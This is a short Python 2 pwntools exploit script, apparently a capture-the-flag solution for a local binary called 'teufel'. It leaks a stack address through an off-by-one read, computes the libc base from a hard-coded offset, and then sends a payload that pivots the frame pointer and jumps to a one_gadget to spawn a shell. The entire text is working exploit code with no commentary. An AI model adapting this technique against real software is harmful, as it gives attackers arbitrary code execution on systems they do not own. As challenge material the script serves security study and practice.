from pwn import *

target = "./teufel"

p = process(target)
e = ELF(target)

#raw_input('')

libc_off = 0x5e8000
vul_addr = 0x4004e6

p.send(p64(0xf0))

payload = "A"*8
payload += "Z"

p.send(payload)

# 41414141414141415a50fff7ff7f0a
data = p.recv()
rbp = "\x00" + data.split("Z")[1][:-1]
rbp = u64(rbp.ljust(8, "\x00"))
libc_base = rbp - libc_off
one_shot  = libc_base + 0x4526a

print "rbp  : {}".format(hex(rbp))
print "libc : {}".format(hex(libc_base))

raw_input('')
p.send(p64(0xf0))

payload = p64(rbp+0x100)
payload += p64(rbp-0x18)
payload += p64(one_shot)

p.send(payload)

p.interactive()

